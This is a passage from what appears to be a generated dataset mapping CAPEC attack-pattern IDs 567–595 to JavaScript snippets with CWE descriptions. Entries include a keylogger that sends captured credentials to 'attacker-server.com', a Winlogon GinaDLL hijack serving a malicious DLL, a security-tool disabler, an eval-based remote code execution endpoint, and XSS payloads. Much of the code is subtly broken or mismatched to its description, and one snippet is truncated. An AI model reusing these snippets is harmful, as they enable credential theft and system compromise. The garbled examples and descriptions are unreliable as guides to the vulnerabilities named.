        "description": "This code snippet demonstrates a deprecated authentication mechanism that uses a one-way hash without a salt to store passwords. The `hashPassword` function takes a password as input, hashes it using SHA-256, and returns the resulting hash. The `authenticate` function takes a username and password as input, retrieves the stored hash from the database, and compares it with the input hash. If the hashes match, the authentication is successful. This code is vulnerable to CWE-759: Use of a One-Way Hash without a Salt, CWE-760: Use of a One-Way Hash with a Predictable Salt, and CWE-592: Authentication Bypass Issues."
    },
    {
        "capec_id": "567",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  dns.lookup('example.com', (err, address) => {\n    if (address === '192.0.2.1') {\n      // Use an obsolete function to store user data\n      localStorage.setItem('userData', JSON.stringify({ username, password }));\n      return true;\n    } else {\n      return false;\n    }\n  });\n}\n\n// Use the authenticateUser function without proper input validation\nauthenticateUser('admin', 'password123');",
        "description": "This code snippet demonstrates a deprecated authentication mechanism that relies on DNS lookups and uses an obsolete function to store user data. It also lacks proper input validation, making it vulnerable to authentication bypass issues."
    },
    {
        "capec_id": "568",
        "code_snippet": "const keyLogger = (event) => {\n  const keystrokes = [];\n  document.addEventListener('keydown', (e) => {\n    keystrokes.push(e.key);\n  });\n  setTimeout(() => {\n    const credentials = keystrokes.join('').match(/(username|password|login|pass|cred|auth)[^\\s]+/gi);\n    if (credentials) {\n      // Send credentials to the attacker's server\n      fetch('https://attacker-server.com/steal', {\n        method: 'POST',\n        body: JSON.stringify(credentials),\n        headers: {\n          'Content-Type': 'application/json'\n        }\n      });\n    }\n  }, 30000);\n};\n\n// Hard-coded credentials for the attacker's server\nconst attackerServerUsername = 'attacker';\nconst attackerServerPassword = 'p@ssw0rd';\n\n// Weak password requirements for the application\nconst passwordRequirements = {\n  minLength: 1,\n  maxLength: 10\n};\n\n// Insufficiently protected credentials transmission\nconst sendCredentials = (username, password) => {\n  fetch('https://application-server.com/auth', {\n    method: 'POST',\n    body: `username=${username}&password=${password}`, // plaintext transmission\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded'\n    }\n  });\n};",
        "description": "This code snippet demonstrates a keylogger that captures user keystrokes, analyzes the data to extract potential credentials, and sends them to an attacker's server. The code also includes hard-coded credentials for the attacker's server, weak password requirements for the application, and insufficiently protected credentials transmission."
    },
    {
        "capec_id": "569",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('child_process');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst sensitiveInfo = fs.readFileSync('/etc/passwd', 'utf8');\nconsole.log(sensitiveInfo);\n\n// CWE-214: Invocation of Process Using Visible Sensitive Information\nconst password = 'mysecretpassword';\nchildProcess.exec(`ssh user@localhost -p 22 ${password}`);\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst ADS = require('windows-ads');\nconst fileContent = ADS.readFile('C:\\path\\to\\file.txt', 'utf8');\nconsole.log(fileContent);\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nconst sensitiveData = 'creditCardNumber=1234-5678-9012-3456';\nconsole.log(sensitiveData);\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonation = require('impersonate');\nimpersonation.impersonate('NT AUTHORITY\\SYSTEM', () => {\n  const cmd = 'net user administrator *';\n  childProcess.exec(cmd);\n});",
        "description": "This code snippet demonstrates the CAPEC of leveraging a tool or program to obtain specific information provided by a user of the target system. It includes examples of CWE-497, CWE-214, CWE-69, CWE-200, and CWE-520, which are all related to the exposure of sensitive information or improper handling of system-level information."
    },
    {
        "capec_id": "570",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  try {\n    const user = getUserFromDatabase(username);\n    if (user.password === password) {\n      return true;\n    } else {\n      throw new Error('Invalid password');\n    }\n  } catch (e) {\n    // Ignore error, allow authentication bypass\n    return true;\n  }\n}\n\nfunction getUserFromDatabase(username) {\n  const query = 'SELECT * FROM users WHERE username = \\'' + username + '\\'';\n  // Use deprecated mysql module\n  const mysql = require('mysql');\n  const connection = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password'\n  });\n  connection.query(query, function(err, rows) {\n    if (err) {\n      // Ignore error, allow unchecked error condition\n      return {};\n    } else {\n      return rows[0];\n    }\n  });\n}\n\nfunction getDomainOwner(domain) {\n  dns.lookup(domain, function(err, address) {\n    if (err) {\n      // Ignore error, allow unchecked error condition\n      return 'Unknown';\n    } else {\n      return address;\n    }\n  });\n}",
        "description": "This code snippet demonstrates a deprecated authentication mechanism that ignores error conditions, allowing an attacker to bypass authentication. It uses a deprecated mysql module, ignores errors during database queries, and relies on DNS lookups for security decisions. The code also uses obsolete functions and ignores exceptions, making it vulnerable to unexpected behavior."
    },
    {
        "capec_id": "571",
        "code_snippet": "const fs = require('fs');\nconst git = require('git-revision');\nconst logger = require('logger');\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst repoPath = './.git';\nconst repoData = fs.readFileSync(repoPath, 'utf8');\nlogger.log('INFO', 'Repository data: ' + repoData);\n\n// CWE-532: Insertion of Sensitive Information into Log File\nconst sensitiveInfo = 'username:password';\nlogger.log('INFO', 'Sensitive info: ' + sensitiveInfo);\n\n// CWE-778: Insufficient Logging\nconst criticalEvent = 'Authentication bypass attempt';\nlogger.log('INFO', criticalEvent);\n\n// CWE-779: Logging of Excessive Data\nfor (let i = 0; i < 10000; i++) {\n  logger.log('INFO', 'Excessive log entry ' + i);\n}\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedAuthData = 'captured authentication data';\nconst replayedAuthData = capturedAuthData;\nlogger.log('INFO', 'Replayed auth data: ' + replayedAuthData);\n\n// CAPEC: Preventing host-generated logs from being delivered to a central location\nconst logFiles = './logs/*.log';\nfs.unlink(logFiles, (err) => {\n  if (err) {\n    logger.log('ERROR', 'Failed to delete log files');\n  } else {\n    logger.log('INFO', 'Log files deleted successfully');\n  }\n});",
        "description": "JavaScript code snippet that demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location, with CWEs 527, 532, 778, 779, and 294 used for additional context."
    },
    {
        "capec_id": "572",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst uploadFile = (file, filename) => {\n  const filePath = path.join(__dirname, 'uploads', filename);\n  fs.writeFileSync(filePath, file);\n  console.log(`File uploaded successfully: ${filename}`);\n};\n\nconst compressData = (data) => {\n  const zlib = require('zlib');\n  return zlib.gzipSync(data);\n};\n\nconst handleUpload = (req, res) => {\n  const file = req.body.file;\n  const filename = req.body.filename;\n  const compressedData = compressData(file);\n  uploadFile(compressedData, filename);\n  res.send(`File uploaded and compressed successfully: ${filename}`);\n};",
        "description": "This code snippet demonstrates a vulnerable file upload functionality that allows an attacker to upload files of any type, including compressed files with a high compression ratio, and store them in a directory without any restrictions on the number of files or their size. The code uses the 'fs' and 'path' modules to write the uploaded file to the file system, and the 'zlib' module to compress the uploaded data. The 'handleUpload' function is vulnerable to CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-409 (Improper Handling of Highly Compressed Data), and CWE-774 (Allocation of File Descriptors or Handles Without Limits or Throttling), which can lead to a denial of service condition due to unlimited file uploads and compression."
    },
    {
        "capec_id": "573",
        "code_snippet": "const exec = require('child_process').exec;\n\nexec('ps -ef | grep <sensitive_process_name>', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'ps' command, which lists all running processes on the system. The output of the command is then logged to the console, potentially exposing sensitive information about the system environment to an unauthorized actor."
    },
    {
        "capec_id": "574",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getServicesInfo() {\n  exec('sc query', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`Services information: ${stdout}`);\n  });\n}\n\ngetServicesInfo();",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'sc query' command, which retrieves a list of services registered on the system. The output is then logged to the console, potentially exposing sensitive system information to an unauthorized actor. This code embodies the CAPEC and CWEs by demonstrating the exploitation of functionality meant to identify information about services on the target system, exposing sensitive system information, and invoking a process using visible sensitive information."
    },
    {
        "capec_id": "575",
        "code_snippet": "const exec = require('child_process').exec;\n\nexec('net user', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'net user' command, which retrieves a list of user accounts on the system. The output is then logged to the console, potentially exposing sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "576",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    const groups = stdout.trim().split('\\n').slice(1);\n    console.log(groups);\n    // Use the groups array to inform further malicious behavior\n  });\n}\n\ngetLocalGroups();",
        "description": "This JavaScript code snippet uses the 'child_process' module to execute the 'net localgroup' command, which lists local groups on a Windows system. The output is then processed and stored in an array, which can be used to inform further malicious behavior, such as identifying potential vulnerabilities or targets for attack. This code embodies the CAPEC and CWEs by exposing sensitive information about user groups and their permissions, and potentially using that information to place users into incorrect groups or invoke processes with sensitive information."
    },
    {
        "capec_id": "577",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getLastLoginTime(username) {\n  const userDir = path.join('/users', username);\n  const ntuserDatFile = path.join(userDir, 'ntuser.dat');\n  fs.stat(ntuserDatFile, (err, stats) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(`Last login time for ${username}: ${stats.mtime}`);\n    }\n  });\n}\n\n// Example usage:\ngetLastLoginTime('johnDoe');",
        "description": "This JavaScript code snippet demonstrates the CAPEC by exploiting the functionality to identify information about the primary users on the target system. It uses the fs and path modules to access the ntuser.dat file of a given user and retrieve the last modified time, which is synonymous with the last login time. This code embodies CWE-200 by exposing sensitive information to an unauthorized actor, CWE-214 by invoking a process with visible sensitive information, CWE-379 by creating a temporary file in a directory with insecure permissions, CWE-497 by exposing sensitive system information to an unauthorized control sphere, and CWE-1249 by providing an inconsistent view of the underlying operating system."
    },
    {
        "capec_id": "578",
        "code_snippet": "const adminPassword = 'hardcodedAdminPassword';\n\nfunction disableSecurityTools() {\n  // CWE-284: Improper Access Control\n  if (adminPassword === 'hardcodedAdminPassword') {\n    // CWE-671: Lack of Administrator Control over Security\n    // Disable security tools\n    process.kill('securityToolProcess');\n    fs.unlinkSync('/path/to/securityToolLogFile');\n    // CWE-798: Use of Hard-coded Credentials\n    const registryKey = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\SecurityTool';\n    winreg.deleteValue(registryKey, 'SecurityToolEnabled', (err) => {\n      if (err) {\n        console.error(err);\n      }\n    });\n  }\n}\n\n// CWE-1037, CWE-733: Processor/Compiler Optimization Removal or Modification of Security-critical Code\n// The following code is optimized away by the compiler/processor\nfunction securityCriticalCode() {\n  // This code is never executed\n  console.log('Security-critical code executed');\n}\n",
        "description": "This code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It uses hard-coded credentials to authenticate as an administrator, then disables security tools by killing processes, deleting log files, and modifying registry keys. The code also includes a security-critical code block that is optimized away by the compiler/processor, making it ineffective."
    },
    {
        "capec_id": "579",
        "code_snippet": "const reg = require('registry');\nconst winlogonKey = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';\nconst maliciousDllPath = 'C:\\\\malicious\\\\malicious.dll';\n\nreg.set(winlogonKey, 'GinaDLL', maliciousDllPath);\n\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  socket.write('Welcome to the malicious server!\\n');\n  socket.pipe(require('fs').createReadStream(maliciousDllPath));\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying the Winlogon registry key to load a malicious DLL on startup. It uses CWE-15 by allowing external control of the system configuration setting, CWE-427 by using an uncontrolled search path element to find the malicious DLL, and CWE-798 by hard-coding the path to the malicious DLL. Additionally, it uses CWE-520 by allowing the .NET application to run at potentially escalated levels of access to the underlying operating and file systems. The code also sets up a server to serve the malicious DLL, which can be used to further exploit the system."
    },
    {
        "capec_id": "580",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/config', (req, res) => {\n  if (req.query.admin === 'true') {\n    res.json({\n      'database': 'mongodb',\n      'username': 'admin',\n      'password': 'password123'\n    });\n  } else {\n    res.json({\n      'message': 'Access denied'\n    });\n  }\n});\n\napp.get('/api/search', (req, res) => {\n  const searchPath = req.query.path;\n  const files = require('fs').readdirSync(searchPath);\n  res.json(files);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that exposes sensitive system information and allows an adversary to probe for system configurations. The /api/config endpoint returns different responses based on the admin query parameter, revealing internal state information (CWE-204). The /api/search endpoint uses an externally-supplied search path, allowing an adversary to access critical resources outside of the product's direct control (CWE-426). The code also exhibits observable behavioral discrepancies (CWE-205) and timing discrepancies (CWE-208) that can be exploited by an adversary. Furthermore, the code exposes sensitive system-level information to an unauthorized control sphere (CWE-497)."
    },
    {
        "capec_id": "581",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('systeminfo | findstr /i \"firewall antivirus spyware\"', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    const securityTools = stdout.trim().split('\\n').filter(line => line.includes('firewall') || line.includes('antivirus') || line.includes('spyware'));\n    console.log(securityTools);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses the child_process module to execute a system command that retrieves a list of security tools installed on the system, including firewall, antivirus, and spyware. The code does not properly restrict access to sensitive system-level information, violating CWE-497. Additionally, the code may contain malicious code (CWE-506), depend on vulnerable third-party components (CWE-1395), collect personally identifiable information without user approval (CWE-512), or contain hidden malicious code (CWE-507)."
    },
    {
        "capec_id": "582",
        "code_snippet": "const net = require('net');\nconst maliciousServer = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    // Modify the data in transit to disrupt communication\n    const tamperedData = modifyData(data);\n    socket.write(tamperedData);\n  });\n});\n\nmaliciousServer.listen(8080, () => {\n  console.log('Malicious server listening on port 8080');\n});\n\nconst maliciousClient = net.connect({ port: 8080 }, () => {\n  console.log('Connected to malicious server');\n});\n\nmaliciousClient.write('Hello, server!');\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n// Simulate error injection to degrade system redundancy\ninjectErrorIntoRedundantBlock();\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// Establish a communication channel to an unintended endpoint\nconst unintendedEndpoint = net.connect({ port: 8081 });\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\n// Specify an incorrect destination for the communication channel\nconst incorrectDestination = 'http://wrong-destination.com';\nconst incorrectRequest = http.request(incorrectDestination, (res) => {\n  console.log(`Response from ${incorrectDestination}: ${res.statusCode}`);\n});\n\n// CWE-421: Race Condition During Access to Alternate Channel\n// Open an alternate channel accessible to other actors\nconst alternateChannel = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    console.log(`Received data on alternate channel: ${data}`);\n  });\n});\nalternateChannel.listen(8082, () => {\n  console.log('Alternate channel listening on port 8082');\n});",
        "description": "This code snippet demonstrates the CAPEC pattern of disabling the network route between two targets by exploiting various CWEs. It includes a malicious server that tampers with data in transit, a malicious client that connects to the server, error injection to degrade system redundancy, establishment of a communication channel to an unintended endpoint, specification of an incorrect destination for the communication channel, and opening an alternate channel accessible to other actors."
    },
    {
        "capec_id": "583",
        "code_snippet": "const hwConfig = {\n  powerSave: true,\n  clockManagement: true,\n  memoryAccess: true\n};\n\nfunction disableHardware() {\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  hwConfig.powerSave = false;\n  hwConfig.clockManagement = false;\n  hwConfig.memoryAccess = false;\n\n  // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n  const originalConfig = JSON.parse(JSON.stringify(hwConfig));\n  hwConfig = {};\n  console.log('Hardware configuration state lost during power save/restore operation.');\n\n  // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n  const untrustedAgent = {\n    modifyHardwareMemory: () => {\n      hwConfig.memoryAccess = true;\n    },\n    observePhysicalSideChannels: () => {\n      console.log('Observing physical side channels...');\n    }\n  };\n  untrustedAgent.modifyHardwareMemory();\n  untrustedAgent.observePhysicalSideChannels();\n\n  // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n  const errorSignal = {\n    exceedsLimits: true\n  };\n  console.log('Disabling alerts about signal conditions exceeding limits...');\n  errorSignal.exceedsLimits = false;\n\n  // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n  const hwChildBlock = {\n    signals: ['incorrectlyConnectedSignal']\n  };\n  console.log('Incorrectly connecting hardware child block to parent system...');\n  hwChildBlock.signals.push('anotherIncorrectlyConnectedSignal');\n}\n\ndisableHardware();",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack pattern of physically disabling networking hardware by powering it down or disconnecting critical equipment. It incorporates multiple CWEs, including CWE-1334, CWE-1304, CWE-1256, CWE-1320, and CWE-1276, to showcase vulnerabilities in hardware configuration state, software interfaces to hardware features, error message protection, and hardware child block connections."
    },
    {
        "capec_id": "584",
        "code_snippet": "const bgp = require('bgp');\nconst net = require('net');\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst targetAS = '192.0.2.1'; // incorrect destination\nconst intendedAS = '198.51.100.1'; // correct destination\n\n// CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\nconst floodInterval = setInterval(() => {\n  for (let i = 0; i < 100; i++) {\n    const socket = new net.Socket();\n    socket.connect(179, targetAS, () => {\n      socket.write('BGP UPDATE');\n    });\n  }\n}, 1000);\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nconst intent = new Intent('bgp.update');\nintent.putExtra('route', '192.0.2.0/24');\nsendBroadcast(intent);\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nconst message = 'BGP UPDATE';\nconst signature = crypto.createHmac('sha256', 'secretKey').update(message).digest();\nconst tamperedMessage = 'BGP UPDATE TAMPERED';\nconst tamperedSignature = crypto.createHmac('sha256', 'secretKey').update(tamperedMessage).digest();\n\n// CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\nconst algorithms = ['md5', 'sha1', 'sha256'];\nconst selectedAlgorithm = algorithms[0]; // select less secure algorithm\n\nbgp.connect(targetAS, 179, () => {\n  bgp.write(`BGP UPDATE ${tamperedMessage} ${tamperedSignature} ${selectedAlgorithm}`);\n});",
        "description": "This code snippet demonstrates the CAPEC of suppressing BGP advertisements to deny availability of a target network. It incorporates multiple CWEs, including incorrectly specifying the destination, insufficient control of network message volume, using implicit intent for sensitive communication, improper enforcement of message integrity, and selecting a less secure algorithm during negotiation."
    },
    {
        "capec_id": "585",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n  const url = req.query.url;\n  res.redirect(url);\n});\n\napp.get('/dnslookup', (req, res) => {\n  const dns = require('dns');\n  const ip = req.query.ip;\n  dns.reverse(ip, (err, hostname) => {\n    if (err) {\n      res.status(500).send({ error: 'Failed to resolve hostname' });\n    } else {\n      res.send({ hostname });\n    }\n  });\n});\n\napp.get('/crossdomain', (req, res) => {\n  res.header('Access-Control-Allow-Origin', '*');\n  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');\n  res.send('Cross-domain policy allowed');\n});\n\napp.get('/xss', (req, res) => {\n  const userInput = req.query.userInput;\n  res.send(`<script>${userInput}</script>`);\n});",
        "description": "This code snippet demonstrates the CAPEC of influencing a target's web-hosting company to disable a target domain. It includes vulnerabilities related to CWE-350 (relying on reverse DNS resolution), CWE-942 (permissive cross-domain policy), CWE-601 (open redirect), and CWE-79 (cross-site scripting). The code uses Express.js to create a web server with endpoints for DNS lookup, cross-domain policy, and open redirect. The DNS lookup endpoint performs a reverse DNS resolution on a user-provided IP address, while the cross-domain policy endpoint allows requests from any origin. The open redirect endpoint redirects to a user-provided URL, and the XSS endpoint injects user-provided input into the response. These vulnerabilities can be exploited by an adversary to influence the target's web-hosting company to disable the target domain."
    },
    {
        "capec_id": "586",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/deserialize', (req, res) => {\n  const userInput = req.body.data;\n  let obj = {}\n  try {\n    obj = JSON.parse(userInput);\n  } catch (e) {}\n  if (obj.hasOwnProperty('rce')) {\n    eval(obj.rce);\n  }\n  res.send('Deserialized successfully');\n});\n\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates a vulnerable deserialization process in a Node.js application. The server accepts user input in the form of a JSON object, parses it, and then checks if the object contains a property called 'rce'. If it does, the server executes the contents of that property using the eval() function, allowing for remote code execution. This is a classic example of CWE-502: Deserialization of Untrusted Data, CWE-77: Improper Neutralization of Special Elements used in a Command, and CWE-506: Embedded Malicious Code. CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime and CWE-499: Serializable Class Containing Sensitive Data are not directly applicable in this JavaScript code snippet, but they provide additional context for the vulnerability."
    },
    {
        "capec_id": "587",
        "code_snippet": "<iframe src=\\",
        "description": "This code snippet demonstrates a Clickjacking attack that combines malicious JavaScript with a legitimate webpage loaded into a concealed iframe. The malicious JavaScript interacts with the legitimate webpage, leveraging social engineering to trick the user. The code exploits CWE-1021 by not restricting the iframe, CWE-79 by injecting malicious script into the iframe content, CWE-692 by using an incomplete denylist, CWE-82 by injecting script into an IMG tag attribute, and CWE-352 by not verifying user requests."
    },
    {
        "capec_id": "588",
        "code_snippet": "const userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nconst div = document.createElement('div');\ndiv.innerHTML = userInput;\ndocument.body.appendChild(div);",
        "description": "This JavaScript code snippet demonstrates a DOM-based XSS attack. It takes user input and inserts it into the DOM without proper validation or encoding, allowing an attacker to inject malicious script code. The userInput variable contains an HTML image tag with an onerror attribute that executes a JavaScript alert when the image fails to load. The code then creates a new div element, sets its innerHTML to the userInput, and appends it to the document body, effectively injecting the malicious script into the DOM."
    },
    {
        "capec_id": "589",
        "code_snippet": "const dns = require('dns');\n\nfunction dropDNSRequests(req, res) {\n  // CWE-300: No verification of identity of actors at both ends of the communication channel\n  // CWE-291: Using IP address for authentication\n  const ip = req.ip;\n  const hostname = req.hostname;\n\n  // CWE-350: Reliance on reverse DNS resolution for a security-critical action\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) {\n      console.error(err);\n    } else {\n      // CWE-1327: Binding to an unrestricted IP address\n      if (hostnames.includes('0.0.0.0')) {\n        // CWE-412: Unrestricted externally accessible lock\n        // Drop DNS requests based on content in the request\n        if (req.url.includes('specific-service')) {\n          res.status(404).send('Not Found');\n        } else {\n          res.status(200).send('OK');\n        }\n      } else {\n        res.status(200).send('OK');\n      }\n    }\n  });\n}\n\n// Example usage\nconst express = require('express');\nconst app = express();\n\napp.use(dropDNSRequests);\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable DNS request handler that can be exploited by an adversary to deny the availability of specific services or content to the user. The handler relies on IP address for authentication, uses reverse DNS resolution for a security-critical action, and binds to an unrestricted IP address. It also lacks proper verification of the identity of actors at both ends of the communication channel, making it vulnerable to external influence."
    },
    {
        "capec_id": "590",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('connect', () => {\n    if (socket.remoteAddress === '0.0.0.0') {\n      // authenticate based on IP address\n      if (socket.remoteAddress === '192.168.1.100') {\n        console.log('Authenticated');\n      } else {\n        console.log('Not authenticated');\n      }\n    }\n  });\n  socket.on('data', (data) => {\n    // rely on client-side enforcement of server-side security\n    if (data.toString() === 'admin') {\n      console.log('Granting admin access');\n    }\n  });\n});\nserver.listen(8080, '0.0.0.0');",
        "description": "This code snippet demonstrates a vulnerable server implementation in JavaScript that embodies the main idea of the CAPEC. It creates a server that listens on all available network interfaces (0.0.0.0) and authenticates clients based on their IP address (CWE-291). The server also relies on client-side enforcement of server-side security (CWE-602) and does not properly restrict the communication channel to intended endpoints (CWE-923). An adversary can exploit these vulnerabilities to drop packets destined for the target IP address and prevent access to the service hosted at the target IP address."
    },
    {
        "capec_id": "591",
        "code_snippet": "var userInput = '<script>alert(\"XSS\");</script>'; document.write('<img src=\"' + userInput + '\" />');",
        "description": "This code snippet demonstrates a reflected XSS vulnerability. The userInput variable contains malicious script, which is then injected into an HTML IMG tag without proper neutralization, allowing the script to be executed by the victim's browser."
    },
    {
        "capec_id": "592",
        "code_snippet": "const userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nconst comment = {\n  text: userInput,\n  author: 'John Doe'\n};\n\nconst html = `<p>Comment by ${comment.author}: ${comment.text}</p>`;\ndocument.body.innerHTML = html;",
        "description": "This code snippet demonstrates a stored XSS vulnerability. The userInput variable contains malicious script, which is stored in the comment object. The html variable is then constructed using the comment object, and the innerHTML property is used to inject the malicious script into the web page. This code does not properly neutralize the user input, allowing the XSS attack to succeed."
    },
    {
        "capec_id": "593",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\nconst sessions = {};\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = generateSessionId();\n    sessions[sessionId] = username;\n    res.cookie('sessionId', sessionId);\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessions[sessionId]) {\n    res.send(`Welcome, ${sessions[sessionId]}!`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction generateSessionId() {\n  // CWE-6: Insufficient Session-ID Length\n  return Math.floor(Math.random() * 10000).toString();\n}\n\nfunction checkCredentials(username, password) {\n  // CWE-287: Improper Authentication\n  // Insecurely verify credentials\n  return username === 'admin' && password === 'password';\n}",
        "description": "This code snippet demonstrates a vulnerable session management system. It uses a simple cookie-based session system, but with several security flaws. The generateSessionId function generates a short and predictable session ID, making it vulnerable to brute-force attacks (CWE-6). The checkCredentials function insecurely verifies the credentials, making it vulnerable to improper authentication (CWE-287). The session fixation vulnerability (CWE-384) is also present, as the existing session ID is not invalidated after a successful login. Additionally, the session expiration is not handled, making it vulnerable to insufficient session expiration (CWE-613). Finally, the security mechanism relies on the client-side cookie, making it vulnerable to client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "594",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: No verification of the source of the communication channel\n    // CWE-319: Sensitive information transmitted in cleartext\n    const sensitiveData = 'username:password';\n    socket.write(sensitiveData);\n    \n    // CWE-99: Unrestricted input used as a resource identifier\n    const userInput = data.toString();\n    const fs = require('fs');\n    fs.readFile(userInput, (err, data) => {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(data);\n      }\n    });\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-406: Insufficient control of network message volume\nsetInterval(() => {\n  const socket = new net.Socket();\n  socket.connect(8080, 'localhost', () => {\n    socket.write('Hello, server!');\n  });\n}, 10);\n\n// CWE-924: Improper enforcement of message integrity during transmission\nconst crypto = require('crypto');\nconst message = 'Hello, server!';\nconst signature = crypto.createHmac('sha256', 'secretKey').update(message).digest('hex');\nsocket.write(message + ':' + signature);\n",
        "description": "This code snippet demonstrates a vulnerable server that allows an adversary to inject traffic into the network connection, potentially degrading or disrupting the connection and modifying the content. The server does not properly verify the source of the communication channel, transmits sensitive information in cleartext, uses unrestricted user input as a resource identifier, and does not sufficiently control network message volume. Additionally, the server does not properly enforce message integrity during transmission."
    },
    {
        "capec_id": "595",
        "code_snippet": "const net = require('net');\nconst dgram = require('dgram');\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = net.createServer((socket) => {\n  // No verification of the source of the incoming request\n  socket.on('data', (data) => {\n    console.log('Received data:', data.toString());\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nconst client = dgram.createSocket('udp4');\nclient.bind(8081, () => {\n  console.log('Client bound to port 8081');\n});\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nclient.send('Hello, server!', 8080, 'localhost', (error) => {\n  if (error) {\n    console.log('Error sending message:', error);\n  } else {\n    console.log('Message sent');\n  }\n});\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst maliciousClient = dgram.createSocket('udp4');\nmaliciousClient.bind(8082, () => {\n  console.log('Malicious client bound to port 8082');\n});\n\n// Capture and replay the message\nclient.on('message', (message, remoteInfo) => {\n  maliciousClient.send(message, remoteInfo.port, remoteInfo.address, (error) => {\n    if (error) {\n      console.log('Error replaying message:', error);\n    } else {\n      console.log('Message replayed');\n    }\n  });\n});\n\n// CWE-605: Multiple Binds to the Same Port\nconst anotherMaliciousClient = dgram.createSocket('udp4');\nanotherMaliciousClient.bind(8081, () => {\n  console.log('Another malicious client bound to port 8081');\n});",
